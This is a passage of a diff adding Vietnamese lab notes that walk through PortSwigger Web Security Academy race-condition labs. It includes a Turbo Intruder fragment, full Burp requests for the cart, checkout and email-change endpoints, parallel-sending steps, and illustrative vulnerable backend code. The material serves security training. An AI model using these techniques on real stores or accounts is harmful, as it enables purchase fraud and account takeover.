+<span class="w">    </span><span class="nx">engine</span><span class="p">.</span><span class="nx">openGate</span><span class="p">(</span><span class="s1">&#39;race1&#39;</span><span class="p">)</span>
+
+<span class="nx">def</span><span class="w"> </span><span class="nx">handleResponse</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">interesting</span><span class="p">)</span><span class="o">:</span>
+<span class="w">    </span><span class="nx">table</span><span class="p">.</span><span class="nx">add</span><span class="p">(</span><span class="nx">req</span><span class="p">)</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện copy list password và thực hiện attack</p>
+</li>
+<li>
+<p>Quan sát thấy password đúng là <code>superman</code></p>
+<p><img alt="image.png" src="image%2010.png" /></p>
+</li>
+<li>
+<p>Login thành công. Điều hướng đến chức năng <code>Admin panel</code></p>
+<p><img alt="image.png" src="image%2011.png" /></p>
+</li>
+<li>
+<p>Xóa user <code>carlos</code> thành công. Hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%2012.png" /></p>
+</li>
+</ul>
+<h1 id="lab-multi-endpoint-race-conditions"><strong>Lab: Multi-endpoint race conditions</strong><a class="headerlink" href="#lab-multi-endpoint-race-conditions" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/race-conditions/lab-race-conditions-multi-endpoint">Lab: Multi-endpoint race conditions | Web Security Academy</a></p>
+<ul>
+<li>Bài này em xem solution ở chỗ ý tưởng 2 endpoint nào có thể có lỗi ạ</li>
+<li>Thực hiện login vào tài khoản <code>wiener:peter</code></li>
+<li>
+<p>Thêm sản phẩm sau vào giỏ hàng</p>
+<p><img alt="image.png" src="image%2013.png" /></p>
+</li>
+<li>
+<p>Trong phần mềm Burpsuite, thực hiện bắt request gửi tới API <code>POST /cart</code> và lưu lại request này</p>
+<ul>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code><span class="nx">POST</span><span class="w"> </span><span class="o">/</span><span class="nx">cart</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">2</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="nx">aba00bb0427e6918188de8800ec0061</span><span class="p">.</span><span class="nx">web</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">academy</span><span class="p">.</span><span class="nx">net</span>
+<span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">session</span><span class="o">=</span><span class="nx">KXpwHJgrsypzJWneJ9HkhyA1RDCfwOjS</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="nx">X11</span><span class="p">;</span><span class="w"> </span><span class="nx">Ubuntu</span><span class="p">;</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="nx">x86_64</span><span class="p">;</span><span class="w"> </span><span class="nx">rv</span><span class="o">:</span><span class="mf">149.0</span><span class="p">)</span><span class="w"> </span><span class="nx">Gecko</span><span class="o">/</span><span class="mf">20100101</span><span class="w"> </span><span class="nx">Firefox</span><span class="o">/</span><span class="mf">149.0</span>
+<span class="nx">Accept</span><span class="o">:</span><span class="w"> </span><span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xhtml</span><span class="o">+</span><span class="nx">xml</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="o">*</span><span class="err">/*;q=0.8</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span><span class="w"> </span><span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span><span class="w"> </span><span class="nx">gzip</span><span class="p">,</span><span class="w"> </span><span class="nx">deflate</span><span class="p">,</span><span class="w"> </span><span class="nx">br</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">www</span><span class="o">-</span><span class="nx">form</span><span class="o">-</span><span class="nx">urlencoded</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span><span class="w"> </span><span class="mf">36</span>
+<span class="nx">Origin</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0aba00bb0427e6918188de8800ec0061.web-security-academy.net</span>
+<span class="nx">Referer</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0aba00bb0427e6918188de8800ec0061.web-security-academy.net/product?productId=2</span>
+<span class="nx">Upgrade</span><span class="o">-</span><span class="nx">Insecure</span><span class="o">-</span><span class="nx">Requests</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Dest</span><span class="o">:</span><span class="w"> </span><span class="nb">document</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Mode</span><span class="o">:</span><span class="w"> </span><span class="nx">navigate</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Site</span><span class="o">:</span><span class="w"> </span><span class="nx">same</span><span class="o">-</span><span class="nx">origin</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">User</span><span class="o">:</span><span class="w"> </span><span class="o">?</span><span class="mf">1</span>
+<span class="nx">Priority</span><span class="o">:</span><span class="w"> </span><span class="nx">u</span><span class="o">=</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">i</span>
+<span class="nx">Te</span><span class="o">:</span><span class="w"> </span><span class="nx">trailers</span>
+
+<span class="nx">productId</span><span class="o">=</span><span class="mf">1</span><span class="o">&amp;</span><span class="nx">redir</span><span class="o">=</span><span class="nx">PRODUCT</span><span class="o">&amp;</span><span class="nx">quantity</span><span class="o">=</span><span class="mf">1</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện tiến đến giỏ hàng và thanh toán.</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2014.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Trong phần mềm Burpsuite, thực hiện bắt request gửi tới API <code>POST /cart/checkout</code> và chuyển sang tab <code>Repeater</code> .</p>
+<ul>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code><span class="nx">POST</span><span class="w"> </span><span class="o">/</span><span class="nx">cart</span><span class="o">/</span><span class="nx">checkout</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">2</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="nx">aba00bb0427e6918188de8800ec0061</span><span class="p">.</span><span class="nx">web</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">academy</span><span class="p">.</span><span class="nx">net</span>
+<span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">session</span><span class="o">=</span><span class="nx">KXpwHJgrsypzJWneJ9HkhyA1RDCfwOjS</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="nx">X11</span><span class="p">;</span><span class="w"> </span><span class="nx">Ubuntu</span><span class="p">;</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="nx">x86_64</span><span class="p">;</span><span class="w"> </span><span class="nx">rv</span><span class="o">:</span><span class="mf">149.0</span><span class="p">)</span><span class="w"> </span><span class="nx">Gecko</span><span class="o">/</span><span class="mf">20100101</span><span class="w"> </span><span class="nx">Firefox</span><span class="o">/</span><span class="mf">149.0</span>
+<span class="nx">Accept</span><span class="o">:</span><span class="w"> </span><span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xhtml</span><span class="o">+</span><span class="nx">xml</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="o">*</span><span class="err">/*;q=0.8</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span><span class="w"> </span><span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span><span class="w"> </span><span class="nx">gzip</span><span class="p">,</span><span class="w"> </span><span class="nx">deflate</span><span class="p">,</span><span class="w"> </span><span class="nx">br</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">www</span><span class="o">-</span><span class="nx">form</span><span class="o">-</span><span class="nx">urlencoded</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span><span class="w"> </span><span class="mf">37</span>
+<span class="nx">Origin</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0aba00bb0427e6918188de8800ec0061.web-security-academy.net</span>
+<span class="nx">Referer</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0aba00bb0427e6918188de8800ec0061.web-security-academy.net/cart</span>
+<span class="nx">Upgrade</span><span class="o">-</span><span class="nx">Insecure</span><span class="o">-</span><span class="nx">Requests</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Dest</span><span class="o">:</span><span class="w"> </span><span class="nb">document</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Mode</span><span class="o">:</span><span class="w"> </span><span class="nx">navigate</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Site</span><span class="o">:</span><span class="w"> </span><span class="nx">same</span><span class="o">-</span><span class="nx">origin</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">User</span><span class="o">:</span><span class="w"> </span><span class="o">?</span><span class="mf">1</span>
+<span class="nx">Priority</span><span class="o">:</span><span class="w"> </span><span class="nx">u</span><span class="o">=</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">i</span>
+<span class="nx">Te</span><span class="o">:</span><span class="w"> </span><span class="nx">trailers</span>
+
+<span class="nx">csrf</span><span class="o">=</span><span class="nx">QyK3cB0Rp21r2HSXc0PrPiyQMN0CwglA</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện gửi song song 9 request gửi tới API <code>POST /cart</code> và 1 request tới API <code>POST /cart/checkout</code> đã lưu ở các bước trước bằng tính năng <code>Send parallel</code></p>
+<ul>
+<li>
+<p>Config group</p>
+<p><img alt="image.png" src="image%2015.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện gửi request. Quan sát thấy mua hàng thành công. Hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%2016.png" /></p>
+<p><img alt="image.png" src="image%2017.png" /></p>
+</li>
+<li>
+<p>Giải thích: có khoảng thời gian giữa các bước kiểm tra tổng sản phẩm và cập nhật trạng thái thanh toán. Code có lỗi có thể như sau:</p>
+<div class="highlight"><pre><span></span><code><span class="err">#</span><span class="w"> </span><span class="o">---</span><span class="w"> </span><span class="nx">Bước</span><span class="w"> </span><span class="mf">1</span><span class="o">:</span><span class="w"> </span><span class="nx">Kiểm</span><span class="w"> </span><span class="nx">tra</span><span class="w"> </span><span class="p">(</span><span class="nx">Check</span><span class="p">)</span><span class="w"> </span><span class="o">---</span>
+<span class="nx">items_at_check</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">db</span><span class="p">.</span><span class="nx">get_cart_items</span><span class="p">(</span><span class="nx">user_id</span><span class="p">)</span><span class="w"> </span><span class="err">#</span><span class="w"> </span><span class="nx">Lấy</span><span class="w"> </span><span class="nx">danh</span><span class="w"> </span><span class="nx">sách</span><span class="w"> </span><span class="nx">lúc</span><span class="w"> </span><span class="nx">này</span><span class="w"> </span><span class="p">(</span><span class="nx">vd</span><span class="o">:</span><span class="w"> </span><span class="nx">chỉ</span><span class="w"> </span><span class="nx">có</span><span class="w"> </span><span class="mf">1</span><span class="w"> </span><span class="nx">Gift</span><span class="w"> </span><span class="nx">Card</span><span class="p">)</span>
+<span class="nx">total_at_check</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">sum</span><span class="p">(</span><span class="nx">item</span><span class="p">.</span><span class="nx">price</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">item</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="nx">items_at_check</span><span class="p">)</span><span class="w"> </span><span class="err">#</span><span class="w"> </span><span class="nx">Tổng</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">$10</span>
+<span class="nx">balance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">db</span><span class="p">.</span><span class="nx">get_user_balance</span><span class="p">(</span><span class="nx">user_id</span><span class="p">)</span><span class="w"> </span><span class="err">#</span><span class="w"> </span><span class="nx">Ví</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">$100</span>
+
+<span class="k">if</span><span class="w"> </span><span class="nx">balance</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="nx">total_at_check</span><span class="o">:</span>
+<span class="w">    </span><span class="err">#</span><span class="w"> </span><span class="o">&lt;---</span><span class="w"> </span><span class="nx">CỬA</span><span class="w"> </span><span class="nx">SỔ</span><span class="w"> </span><span class="nx">RACE</span><span class="w"> </span><span class="p">(</span><span class="nx">RACE</span><span class="w"> </span><span class="nx">WINDOW</span><span class="p">)</span><span class="w"> </span><span class="o">---&gt;</span>
+<span class="w">    </span><span class="err">#</span><span class="w"> </span><span class="nx">Lúc</span><span class="w"> </span><span class="nx">này</span><span class="p">,</span><span class="w"> </span><span class="nx">một</span><span class="w"> </span><span class="nx">request</span><span class="w"> </span><span class="nx">khác</span><span class="w"> </span><span class="nx">thực</span><span class="w"> </span><span class="nx">hiện</span><span class="w"> </span><span class="nx">db</span><span class="p">.</span><span class="nx">add_item_to_cart</span><span class="p">(</span><span class="nx">jacket</span><span class="p">)</span><span class="w"> </span><span class="nx">thành</span><span class="w"> </span><span class="nx">công</span><span class="p">.</span>
+
+<span class="w">    </span><span class="err">#</span><span class="w"> </span><span class="o">---</span><span class="w"> </span><span class="nx">Bước</span><span class="w"> </span><span class="mf">2</span><span class="o">:</span><span class="w"> </span><span class="nx">Thực</span><span class="w"> </span><span class="nx">hiện</span><span class="w"> </span><span class="p">(</span><span class="nx">Act</span><span class="p">)</span><span class="w"> </span><span class="o">---</span>
+<span class="w">    </span><span class="err">#</span><span class="w"> </span><span class="nx">Thay</span><span class="w"> </span><span class="nx">vì</span><span class="w"> </span><span class="nx">dùng</span><span class="w"> </span><span class="s1">&#39;total_at_check&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">server</span><span class="w"> </span><span class="nx">lại</span><span class="w"> </span><span class="nx">truy</span><span class="w"> </span><span class="nx">vấn</span><span class="w"> </span><span class="nx">lại</span><span class="w"> </span><span class="nx">giỏ</span><span class="w"> </span><span class="nx">hàng</span><span class="w"> </span>
+<span class="w">    </span><span class="err">#</span><span class="w"> </span><span class="nx">để</span><span class="w"> </span><span class="nx">lấy</span><span class="w"> </span><span class="nx">danh</span><span class="w"> </span><span class="nx">sách</span><span class="w"> </span><span class="s2">&quot;thực tế&quot;</span><span class="w"> </span><span class="nx">hiện</span><span class="w"> </span><span class="nx">tại</span><span class="w"> </span><span class="nx">trước</span><span class="w"> </span><span class="nx">khi</span><span class="w"> </span><span class="nx">chốt</span><span class="w"> </span><span class="nx">đơn</span><span class="p">.</span>
+
+<span class="w">    </span><span class="nx">actual_items</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">db</span><span class="p">.</span><span class="nx">get_cart_items</span><span class="p">(</span><span class="nx">user_id</span><span class="p">)</span><span class="w"> </span><span class="err">#</span><span class="w"> </span><span class="nx">Bây</span><span class="w"> </span><span class="nx">giờ</span><span class="w"> </span><span class="nx">đã</span><span class="w"> </span><span class="nx">có</span><span class="o">:</span><span class="w"> </span><span class="nx">Gift</span><span class="w"> </span><span class="nx">Card</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">Jacket</span>
+<span class="w">    </span><span class="nx">actual_total</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">sum</span><span class="p">(</span><span class="nx">item</span><span class="p">.</span><span class="nx">price</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">item</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="nx">actual_items</span><span class="p">)</span><span class="w"> </span><span class="err">#</span><span class="w"> </span><span class="nx">Tổng</span><span class="w"> </span><span class="nx">mới</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">$1347</span>
+
+<span class="w">    </span><span class="nx">db</span><span class="p">.</span><span class="nx">deduct_balance</span><span class="p">(</span><span class="nx">user_id</span><span class="p">,</span><span class="w"> </span><span class="nx">actual_total</span><span class="p">)</span><span class="w"> </span><span class="err">#</span><span class="w"> </span><span class="nx">Trừ</span><span class="w"> </span><span class="nx">$1347</span><span class="w"> </span><span class="nx">từ</span><span class="w"> </span><span class="nx">$100</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="o">-</span><span class="nx">$1247</span>
+<span class="w">    </span><span class="nx">db</span><span class="p">.</span><span class="nx">confirm_order</span><span class="p">(</span><span class="nx">user_id</span><span class="p">,</span><span class="w"> </span><span class="nx">actual_items</span><span class="p">)</span>
+</code></pre></div>
+</li>
+<li>
+<p>Về bước check thời gian trong lý thuyết, có thể dùng send sequence request (one connection). Nếu như chỉ gói đầu vượt thời gian → có thể test race bình thường vì nếu gửi cùng 1 packet thì tất cả cùng đến chậm do cùng độ trễ hạ tầng mạng không phải do be xử lý</p>
+</li>
+</ul>
+<h1 id="lab-single-endpoint-race-conditions"><strong>Lab: Single-endpoint race conditions</strong><a class="headerlink" href="#lab-single-endpoint-race-conditions" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint">Lab: Single-endpoint race conditions | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện login tài khoản <code>wiener:peter</code> . Điều hướng đến chức năng <code>My account &gt; Update email</code></p>
+<p><img alt="image.png" src="image%2018.png" /></p>
+</li>
+<li>
+<p>Tại đây, quan sát thấy khi update email thì sẽ có link gửi về email mới.</p>
+<p><img alt="image.png" src="image%2019.png" /></p>
+</li>
+<li>
+<p>Trong phần mềm Burpsuite, thực hiện bắt request gửi tới API <code>POST /my-account/change-email</code> và chuyển sang tab <code>Repeater</code> . Tại đây, thực hiện đổi email muốn update thành <code>carlos@[ginandjuice.shop](http://40ginandjuice.shop/)</code>  và <a href="mailto:wiener@exploit-0a5000a803afbca3807834c6017a0053.exploit-server.net"><code>wiener@exploit-0a5000a803afbca3807834c6017a0053.exploit-server.net</code></a> . Thực hiện gửi song song các request này</p>
+<ul>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code><span class="nx">POST</span><span class="w"> </span><span class="o">/</span><span class="nx">my</span><span class="o">-</span><span class="nx">account</span><span class="o">/</span><span class="nx">change</span><span class="o">-</span><span class="nx">email</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">2</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="nx">ade008503a8bcbb8039353900ce0054</span><span class="p">.</span><span class="nx">web</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">academy</span><span class="p">.</span><span class="nx">net</span>
+<span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">session</span><span class="o">=</span><span class="nx">PiG4GQiksKZh09fdqGXByqQleTB484Ge</span>
+<span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span><span class="w"> </span><span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="nx">X11</span><span class="p">;</span><span class="w"> </span><span class="nx">Ubuntu</span><span class="p">;</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="nx">x86_64</span><span class="p">;</span><span class="w"> </span><span class="nx">rv</span><span class="o">:</span><span class="mf">149.0</span><span class="p">)</span><span class="w"> </span><span class="nx">Gecko</span><span class="o">/</span><span class="mf">20100101</span><span class="w"> </span><span class="nx">Firefox</span><span class="o">/</span><span class="mf">149.0</span>
+<span class="nx">Accept</span><span class="o">:</span><span class="w"> </span><span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xhtml</span><span class="o">+</span><span class="nx">xml</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="o">*</span><span class="err">/*;q=0.8</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span><span class="w"> </span><span class="nx">en</span><span class="o">-</span><span class="nx">US</span><span class="p">,</span><span class="nx">en</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span><span class="w"> </span><span class="nx">gzip</span><span class="p">,</span><span class="w"> </span><span class="nx">deflate</span><span class="p">,</span><span class="w"> </span><span class="nx">br</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">www</span><span class="o">-</span><span class="nx">form</span><span class="o">-</span><span class="nx">urlencoded</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span><span class="w"> </span><span class="mf">112</span>
+<span class="nx">Origin</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0ade008503a8bcbb8039353900ce0054.web-security-academy.net</span>
+<span class="nx">Referer</span><span class="o">:</span><span class="w"> </span><span class="nx">https</span><span class="o">:</span><span class="c1">//0ade008503a8bcbb8039353900ce0054.web-security-academy.net/my-account?id=wiener</span>
+<span class="nx">Upgrade</span><span class="o">-</span><span class="nx">Insecure</span><span class="o">-</span><span class="nx">Requests</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Dest</span><span class="o">:</span><span class="w"> </span><span class="nb">document</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Mode</span><span class="o">:</span><span class="w"> </span><span class="nx">navigate</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Site</span><span class="o">:</span><span class="w"> </span><span class="nx">same</span><span class="o">-</span><span class="nx">origin</span>
+<span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">User</span><span class="o">:</span><span class="w"> </span><span class="o">?</span><span class="mf">1</span>
+<span class="nx">Priority</span><span class="o">:</span><span class="w"> </span><span class="nx">u</span><span class="o">=</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">i</span>
+<span class="nx">Te</span><span class="o">:</span><span class="w"> </span><span class="nx">trailers</span>
+
+<span class="nx">email</span><span class="o">=</span><span class="p">&lt;</span><span class="nt">email</span><span class="p">&gt;</span><span class="o">&amp;</span><span class="nx">csrf</span><span class="o">=</span><span class="nx">aJELJu7ICXRXHTLiU8aKWWKJtXrDt0JS</span>
+</code></pre></div>
+</li>
+<li>
+<p>Config</p>
+<p><img alt="image.png" src="image%2020.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Vào trong mail của chúng ta, nhận thấy có mail gửi về. Thực hiện click vào và nhận thấy email đã update thành <code>carlos@[ginandjuice.shop](http://40ginandjuice.shop/)</code></p>
+<p><img alt="image.png" src="image%2021.png" /></p>
+<p><img alt="image.png" src="image%2022.png" /></p>
+</li>
+<li>
+<p>Thực hiện xóa user <code>carlos</code> và hoàn thành giải lab</p>
+<p><img alt="image.png" src="image%2023.png" /></p>
+</li>
+<li>
+<p>Code phía backend có thể như sau, race window sẽ có ở khi truy vấn email sẽ gửi</p>
+<div class="highlight"><pre><span></span><code><span class="err">#</span><span class="w"> </span><span class="nx">Route</span><span class="w"> </span><span class="nx">xử</span><span class="w"> </span><span class="nx">lý</span><span class="w"> </span><span class="nx">yêu</span><span class="w"> </span><span class="nx">cầu</span><span class="w"> </span><span class="nx">đổi</span><span class="w"> </span><span class="nx">email</span>
+<span class="err">@</span><span class="nx">app</span><span class="p">.</span><span class="nx">route</span><span class="p">(</span><span class="s1">&#39;/change-email&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+<span class="nx">def</span><span class="w"> </span><span class="nx">handle_change_email</span><span class="p">()</span><span class="o">:</span>
+<span class="w">    </span><span class="nx">new_email</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">request</span><span class="p">.</span><span class="nx">form</span><span class="p">[</span><span class="s1">&#39;email&#39;</span><span class="p">]</span>
+<span class="w">    </span><span class="nx">user_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">session</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">]</span>
+
+<span class="w">    </span><span class="err">#</span><span class="w"> </span><span class="nx">BƯỚC</span><span class="w"> </span><span class="mf">1</span><span class="o">:</span><span class="w"> </span><span class="nx">Cập</span><span class="w"> </span><span class="nx">nhật</span><span class="w"> </span><span class="nx">địa</span><span class="w"> </span><span class="nx">chỉ</span><span class="w"> </span><span class="nx">email</span><span class="w"> </span><span class="nx">đang</span><span class="w"> </span><span class="nx">chờ</span><span class="w"> </span><span class="nx">vào</span><span class="w"> </span><span class="nx">Database</span>
+<span class="w">    </span><span class="err">#</span><span class="w"> </span><span class="nx">Mỗi</span><span class="w"> </span><span class="nx">lần</span><span class="w"> </span><span class="nx">gọi</span><span class="p">,</span><span class="w"> </span><span class="nx">lệnh</span><span class="w"> </span><span class="nx">này</span><span class="w"> </span><span class="nx">sẽ</span><span class="w"> </span><span class="nx">GHI</span><span class="w"> </span><span class="nx">ĐÈ</span><span class="w"> </span><span class="nx">lên</span><span class="w"> </span><span class="nx">giá</span><span class="w"> </span><span class="nx">trị</span><span class="w"> </span><span class="nx">cũ</span><span class="w"> </span><span class="nx">trong</span><span class="w"> </span><span class="nx">cột</span><span class="w"> </span><span class="nx">pending_email</span>
+<span class="w">    </span><span class="nx">db</span><span class="p">.</span><span class="nx">execute</span><span class="p">(</span><span class="s2">&quot;UPDATE users SET pending_email = ? WHERE id = ?&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">new_email</span><span class="p">,</span><span class="w"> </span><span class="nx">user_id</span><span class="p">))</span>
+
+<span class="w">    </span><span class="err">#</span><span class="w"> </span><span class="nx">BƯỚC</span><span class="w"> </span><span class="mf">2</span><span class="o">:</span><span class="w"> </span><span class="nx">Kích</span><span class="w"> </span><span class="nx">hoạt</span><span class="w"> </span><span class="nx">tiến</span><span class="w"> </span><span class="nx">trình</span><span class="w"> </span><span class="nx">gửi</span><span class="w"> </span><span class="nx">email</span><span class="w"> </span><span class="nx">xác</span><span class="w"> </span><span class="nx">nhận</span>
+<span class="w">    </span><span class="err">#</span><span class="w"> </span><span class="nx">Race</span><span class="w"> </span><span class="nx">condition</span><span class="w"> </span><span class="nx">xảy</span><span class="w"> </span><span class="nx">ra</span><span class="w"> </span><span class="nx">ở</span><span class="w"> </span><span class="nx">đây</span><span class="w"> </span><span class="nx">nếu</span><span class="w"> </span><span class="nx">hàm</span><span class="w"> </span><span class="nx">này</span><span class="w"> </span><span class="nx">đọc</span><span class="w"> </span><span class="nx">lại</span><span class="w"> </span><span class="nx">database</span><span class="w"> </span><span class="nx">để</span><span class="w"> </span><span class="nx">lấy</span><span class="w"> </span><span class="nx">email</span>
+<span class="w">    </span><span class="nx">send_confirmation_process</span><span class="p">(</span><span class="nx">user_id</span><span class="p">)</span>
+
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="s2">&quot;Email xác nhận đã được gửi!&quot;</span>
+
